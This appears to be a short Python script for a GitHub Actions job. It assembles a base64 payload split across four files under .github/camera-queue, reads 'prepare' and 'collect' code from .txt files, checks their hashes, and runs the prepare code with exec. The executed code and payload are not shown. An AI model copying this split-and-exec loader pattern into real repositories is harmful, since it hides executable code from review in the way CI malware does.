import base64, hashlib, lzma, os
from pathlib import Path
PAYLOAD = ''.join(Path(p).read_text().strip() for p in ['.github/camera-queue/part-00.b64', '.github/camera-queue/part-01.b64', '.github/camera-queue/part-02.b64', '.github/camera-queue/part-03.b64'])
scripts = {}
for label, spec in {'prepare': {'files': ['.github/camera-queue/prepare-00.txt', '.github/camera-queue/prepare-01.txt', '.github/camera-queue/prepare-02.txt'], 'sha256': '8d483643211654566951d815db26bbbec8e0f8ecddf145701b80385c439d1d0b'}, 'collect': {'files': ['.github/camera-queue/collect-00.txt'], 'sha256': 'b0cbcbe9ca75f3ac52a87c2ef8431a813fba7db1dabc5f805e16a96351b0d5f5'}}.items():
    code = b''.join(Path(p).read_bytes() for p in spec['files'])
    assert hashlib.sha256(code).hexdigest() == spec['sha256'], label
    compile(code, label, 'exec')
    scripts[label] = code
collector = Path(os.environ['RUNNER_TEMP'])/'camera-queue-collect.py'
collector.write_bytes(scripts['collect'])
exec(compile(scripts['prepare'], 'prepare', 'exec'), dict(PAYLOAD=PAYLOAD))
